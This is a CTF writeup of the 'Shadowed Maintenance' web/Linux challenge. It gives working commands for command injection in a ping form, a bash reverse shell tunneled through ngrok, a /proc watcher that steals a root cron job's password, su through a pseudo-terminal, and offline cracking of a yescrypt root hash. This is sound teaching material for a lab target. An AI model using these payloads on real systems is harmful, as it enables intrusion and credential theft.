# Shadowed Maintenance — CTF Writeup

**CTF:** Cyberspectre, September 2026
**Category:** Web / Linux
**Points:** 275
**Flag:** `cyberspectre{n0_cr0n_c4n_h1de_f0r3v3r}`

## What this challenge is actually testing
![alt text](<C25-shadowed maintenance.png>)
![alt text](<C25-shadowed maintenance_1.png>)
![alt text](<C25-shadowed maintenance_2.png>)

Five stacked skills:

1. Spotting and exploiting **OS command injection** in a web form.
2. Getting a **reverse shell** to reach you even though your home computer sits behind NAT (no public IP).
3. **Reading source code** on a compromised box instead of guessing blindly.
4. **Watching running processes** closely enough to catch a secret that only exists for a split second.
5. **Cracking a password hash** offline once you've extracted it.

None of these need to be scary. Each one is just a repeatable set of clicks and commands. Let's go through it slowly.

---

## Part 0: Setting up your attacker machine

You need a Linux environment for most of this — not because Windows can't technically do parts of it, but because the tools involved (netcat listeners, `script`, process watching via `/proc`) are Linux-native concepts. I'll flag Windows options where they genuinely exist.

**If you're on Kali already:** you're set, skip to Part 1.

**If you're on Windows:** install WSL so you have a real Linux shell to work from:
```powershell
wsl --install
```
Restart when prompted, then open the "Kali" or "Ubuntu" app from your Start menu. Everything from here on runs inside that WSL window, not native PowerShell.

**Why this matters:** the exploitation phase needs a listener that a remote server can connect back to, and later you need a pseudo-terminal trick (`script`) that doesn't exist on Windows. Trying to do this natively in PowerShell will cost you more time than just spinning up WSL once.

---

## Part 1: Finding the injection point

### Why you look here first

The challenge description says the app does "internal network lookups." That phrasing is a hint by itself — a lookup tool that checks if a host is reachable almost always does this by running a real system command like `ping` behind the scenes. If the developer building that feature took your input and pasted it straight into a shell command, you can smuggle your own commands in alongside it.

### The test

Open the target site in your browser. Find the lookup form (it probably asks for an IP or hostname). Instead of a normal IP, try:

```
127.0.0.1; id
```

**Why this specific payload:** the semicolon (`;`) is a shell separator — it tells the shell "run this command, then run this next one, no matter what happened with the first." If the server takes your raw input and drops it into a shell command like `ping -c 2 <your input>`, your input becomes `ping -c 2 127.0.0.1; id` — which pings successfully **and** then runs `id`, a harmless command that just prints who the web server is running as.

**How to send it (through the browser):** just type it into the form field and submit, exactly like a normal user would.

**How to send it with curl (Linux/WSL), for more control:**
```bash
curl -skG "https://cyberspectre-shadowed-maintenance.chals.io/" --data-urlencode 'host=127.0.0.1; id'
```

Breaking that command down:
- `-s` — silent, don't show progress bars
- `-k` — ignore SSL certificate warnings (fine for CTF targets)
- `-G` — turn this into a GET request with URL parameters
- `--data-urlencode 'host=...'` — safely encode your payload as the `host` parameter, handling special characters like `;` correctly

**What success looks like:** the response includes something like `uid=33(www-data) gid=33(www-data)`. That confirms two things — the injection worked, and you're currently running as `www-data`, the low-privilege account the web server itself runs under. That's your foothold, not the finish line.

---

## Part 2: Reading the source code to understand the bug

### Why

Once you know injection works, it helps to actually see *why* — both to confirm your understanding and because CTF authors often leave other clues nearby in the same file.

Using your injection, read the file:
```
host=127.0.0.1; cat /var/www/html/index.php
```

You'll see something like:
```php
$cmd = "ping -c 2 " . $host . " 2>&1";
$result = shell_exec($cmd);
```

**Why this is broken:** `$host` is your raw input, concatenated directly into a string that gets handed to the shell. There's no filtering, no escaping, nothing checking whether you typed a real IP or a full shell command. This is the textbook example of command injection — user input and executable code sharing the same string with nothing separating them.

---

## Part 3: Getting a real shell (not just one command at a time)

### Why this step exists

Sending `host=127.0.0.1; cat somefile` works fine for reading one file at a time, but it's slow and clunky for real exploration. You want an actual interactive shell — something where you type commands and see responses live, the same as being logged in directly.

### The problem: NAT

Your home computer almost certainly doesn't have a public IP address that the internet can reach directly — you're behind your router's NAT (Network Address Translation). If you tell the target server "connect back to me," it needs an address it can actually reach, and your raw home IP usually isn't one.

### The fix: a tunneling service

A tunneling tool like **ngrok** creates a public address that forwards traffic straight to your machine, punching through NAT without you touching your router settings.

**Setup (Linux/WSL):**
```bash
# download and install ngrok following their site's instructions, then:
ngrok tcp 4444
```
This gives you a public address like `0.tcp.ngrok.io:XXXXX` that forwards to port 4444 on your own machine.

**Start a listener on your machine, in a separate terminal:**
```bash
nc -lvnp 4444
```
This tells netcat: listen (`-l`) on port 4444, show verbose output (`-v`), and don't resolve DNS (`-n`) so it starts instantly.

**Trigger the target to connect back to you**, using your injection point again:
```
host=127.0.0.1; bash -c 'bash -i >& /dev/tcp/0.tcp.ngrok.io/XXXXX 0>&1'
```
Replace `0.tcp.ngrok.io` and `XXXXX` with your actual ngrok forwarding address.

**What this payload does, piece by piece:**
- `bash -i` — start an interactive Bash session
- `>& /dev/tcp/HOST/PORT` — redirect both output and errors into a raw TCP connection to your ngrok address (Bash has this TCP trick built in without needing extra tools)
- `0>&1` — redirect input the same way, so you can actually type commands and have them received

**What success looks like:** your `nc -lvnp 4444` window suddenly shows a connection, and you get a shell prompt. Type `id` to confirm — you should still see `uid=33(www-data)`, but now it's interactive.

---

## Part 4: Enumerating the box

### Why

You're in, but as a low-privilege user. Before doing anything else, look around — the challenge hints specifically nudge you toward local files and other accounts.

```bash
cat /etc/passwd
```

**Why this file:** every user account on a Linux system is listed here, even ones that can't log in interactively. It shows you `www-ctf` and `n0flow` as accounts that exist beyond the obvious ones.

```bash
ls -la /opt/maintenance
```

This turns up two interesting files:
- `maintenance.db` — owned `root:maintainers`, permission `0640` (root can read/write, the `maintainers` group can read, nobody else)
- `sync_status.sh` — owned `root:root`, permission `0700` (only root can touch it at all)

**Why the group ownership matters:** `n0flow` belongs to the `maintainers` group (check with `id n0flow` or `groups n0flow` if you can). That means if you become `n0flow`, you'll be able to read `maintenance.db` even though you're not root — Linux group permissions grant that access.

```bash
cat /var/www/html/healthcheck.php
```

This file's comments describe it as used by "the maintenance sync job" — a thread connecting the web app to something that runs with more privilege in the background.

```bash
cat /entrypoint.sh
```

This is the script that set up the container when it started. Reading it (comments especially) explains that a cron job — a scheduled task that runs automatically — is behind the maintenance sync, and that this is the root-owned process worth watching.

---

## Part 5: Catching a credential that only exists for a split second

### Why this is the hard part

A cron job is running as root periodically, and it apparently authenticates to `healthcheck.php` using a username and password passed via `curl -u`. Normally, running `ps aux` shows you every process's full command line, arguments included. But this one appears blank in a casual glance — because whoever built this challenge made the process sanitize (blank out) its own arguments almost immediately after starting, specifically to make this harder.

### The fix: watch faster than a normal `ps` snapshot

A single `ps aux` command only takes one snapshot in time. If the credential is visible for a few milliseconds before being scrubbed, you need something checking constantly, not just once.

**A simple polling loop (Bash):**
```bash
while true; do
  ps aux | grep curl
  sleep 0.05
done
```
This checks every 50 milliseconds instead of once. It's crude but can work.

**A more reliable approach — watching `/proc` directly:**

Every running process on Linux has a folder under `/proc/<PID>/` containing its details, including `/proc/<PID>/cmdline` — the exact command it was launched with. A short Python script can poll for new PIDs launched by root and grab their `cmdline` the instant they appear, before the process has a chance to sanitize itself:

```python
import os, time

seen = set()
while True:
    for pid in os.listdir('/proc'):
        if not pid.isdigit() or pid in seen:
            continue
        seen.add(pid)
        try:
            with open(f'/proc/{pid}/cmdline', 'rb') as f:
                cmd = f.read().replace(b'\x00', b' ').decode(errors='ignore')
            if 'curl' in cmd:
                print(pid, cmd)
        except FileNotFoundError:
            pass
    time.sleep(0.01)
```

Save this on the target box (e.g., `/tmp/.watch.py`) and run it:
```bash
python3 /tmp/.watch.py
```

**Why this works where `ps` alone doesn't:** you're catching the process the moment it's created, reading its raw command-line arguments directly from the kernel's process table, before the program has had a chance to overwrite or hide them.

**What you're watching for:** eventually this prints something like:
```
curl -s -o /dev/null -u n0flow:Qu3ueFlow!Sync99 http://127.0.0.1/healthcheck.php
```

That's a username and password for the `n0flow` account, caught in the act.

**Cleanup note:** once you've captured this, delete your watcher script:
```bash
rm /tmp/.watch.py
```
This is a shared box — leaving scripts lying around is bad practice and explicitly against the challenge rules.

---

## Part 6: Switching to the `n0flow` user

### Why this is trickier than it sounds

Your shell right now came from a web exploit, not a real login — it doesn't have a proper terminal (TTY) attached. Commands like `su` expect to interactively prompt you for a password on a real terminal. If you just try to pipe a password straight into `su`, it often fails silently because there's no TTY for it to talk to.

### The fix: `script`

The `script` command creates a pseudo-terminal (a fake but functional TTY) that programs like `su` will accept as real.

```bash
(sleep 1; printf "Qu3ueFlow!Sync99\n") | script -qec "su - n0flow -c \"id\"" /dev/null
```

**Breaking this down:**
- `(sleep 1; printf "Qu3ueFlow!Sync99\n")` — wait one second, then print the password followed by a newline. The delay gives `su` a moment to actually display its password prompt before your password races through
- `| script -qec "..." /dev/null` — pipe that timed output into `script`, which runs the quoted command inside a proper pseudo-terminal, and throws the session recording away (`/dev/null`) since we don't need it saved
- `su - n0flow -c "id"` — switch to user `n0flow`, using a login shell (`-`), and immediately run `id` to confirm it worked

**What success looks like:**
```
uid=1001(n0flow) gid=1001(n0flow) groups=1001(n0flow),1002(maintainers)
```

Note `maintainers` in that group list — that confirms you now have the group permission needed to read `maintenance.db` from Part 4.

---

## Part 7: Reading the database and finding root's hash

```bash
sqlite3 /opt/maintenance/maintenance.db
```

This drops you into an interactive SQLite prompt. List tables first:
```sql
.tables
```

Then look at the credentials table (adjust the name to whatever `.tables` showed you):
```sql
SELECT * FROM credentials;
```

**What you'll find:** a row confirming `n0flow`'s password again (matching what you already caught), and a second row for a `system`/`root` account holding a long string starting with `$y$...` — this is a **yescrypt password hash**, not the plaintext password itself.

**Why it's a hash and not the password:** Linux never stores actual passwords, only one-way hashes of them. You can't reverse a hash mathematically — the only practical way to "crack" one is to hash a huge list of guesses and check for a match. That's exactly what comes next.

Exit SQLite:
```sql
.quit
```

---

## Part 8: Cracking the hash

### Why offline cracking

You don't want to guess passwords against the live server (slow, and might trigger lockouts or alerts). Instead, you copy the hash to your own attacker machine and try to crack it there, where you can try millions of guesses per second with no risk to the target.

### Get the hash onto your machine

Copy the hash string you found in SQLite and save it locally (on your Kali/WSL machine, not the target):
```bash
echo '$y$j9T$vKNoIFgCjXNAkUZHQ5g1r.$UK4bCkLO6w2g34qc6O6U4ROTxJwcSrUTsa.ijTj5Zy/' > ~/root.hash
```

### Run John the Ripper

**Linux/WSL (Kali usually has this preinstalled):**
```bash
john --format=crypt --wordlist=/usr/share/wordlists/rockyou.txt ~/root.hash
```

**What each part does:**
- `--format=crypt` — tells John this is a generic crypt-style hash (which yescrypt falls under), rather than a more specific format
- `--wordlist=/usr/share/wordlists/rockyou.txt` — use rockyou.txt, a massive leaked password list that's the standard starting point for cracking in CTFs. On Kali it's often already present but gzip-compressed; if so, unzip it first:
  ```bash
  sudo gunzip /usr/share/wordlists/rockyou.txt.gz
  ```
- `~/root.hash` — the file containing the hash you're attacking

**To see the cracked result once it finishes:**
```bash
john --show ~/root.hash
```

**Windows note:** John the Ripper does have a native Windows build (via "John the Ripper for Windows" release packages), so this step is possible outside WSL too. But you'd still need rockyou.txt downloaded separately, and honestly, running it inside WSL alongside everything else you're already doing there is simpler.

This should crack in seconds, since it's a common wordlist entry. You get back:
```
trustno1
```

---

## Part 9: Becoming root

Same pseudo-terminal trick as Part 6, just targeting `root` this time with the password you just cracked:

```bash
(sleep 1; printf "trustno1\n") | script -qec "su - root -c \"id; cat /root/root.txt\"" /dev/null
```

**What success looks like:**
```
uid=0(root) gid=0(root) groups=0(root)
cyberspectre{n0_cr0n_c4n_h1de_f0r3v3r}
```

That's your flag.

---

## The chain, in one line

Command injection in a ping form → reverse shell tunneled out via ngrok to beat NAT → source code read to confirm the bug → local users and a maintenance folder enumerated → a root cron job's credentials caught mid-flight with a fast `/proc` watcher → pseudo-TTY trick to `su` into that account → a database read revealing root's password hash → hash cracked offline with John + rockyou → `su` to root → flag.

## Cleanup reminder

This is a shared instance:
- Delete any watcher scripts you uploaded (`/tmp/.watch.py` or similar)
- Kill any lingering reverse shell processes you spawned if you can
- Don't leave `root.hash` or anything else behind on the target box — that file should only exist on your own attacker machine
- Don't change file permissions, stop services, or touch the cron job itself